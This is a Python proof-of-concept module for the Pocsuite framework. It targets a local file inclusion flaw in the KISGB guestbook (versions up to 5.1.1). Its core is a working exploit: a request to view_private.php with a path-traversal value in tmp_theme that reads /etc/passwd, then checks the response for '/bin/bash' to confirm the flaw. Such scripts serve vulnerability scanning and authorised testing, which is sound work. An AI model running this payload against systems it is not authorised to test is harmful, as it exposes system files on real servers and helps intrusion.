#!/usr/bin/env python
# -*- coding:utf-8 -*-



from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register



class TestPOC(POCBase):
    vulID = '65284'
    version = '1'
    vulDate = '1206806400'
    createDate = '1442937600'
    references = ['http://www.sebug.net/vuldb/ssvid-65284']
    name = 'KISGB Local File Inclusion'
    appPowerLink = 'http://sourceforge.net/projects/kisgb/'
    appName = 'KISGB (Keep It Simple Guest Book)'
    appVersion = '<=5.1.1'
    vulType = 'Local File Inclusion'
    desc = '''KISGB view_private.php文件在处理传入的参数时存在缺陷，导致产生本地文件包含漏洞。'''
    samples = ['']


    def _attack(self):
        return self._verify()


    def _verify(self, verify=True):
        result = {}
        vul_url = '%s/view_private.php?start=1&action=edit&tmp_theme=../../../../../../etc/passwd' % self.url
        response = req.get(vul_url, timeout=10).content


        if '/bin/bash' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_attack(result)



    def parse_attack(self, result):
        output = Output(self)


        if result:
            output.success(result)
        else:
            output.fail('failed')


        return output
register(TestPOC)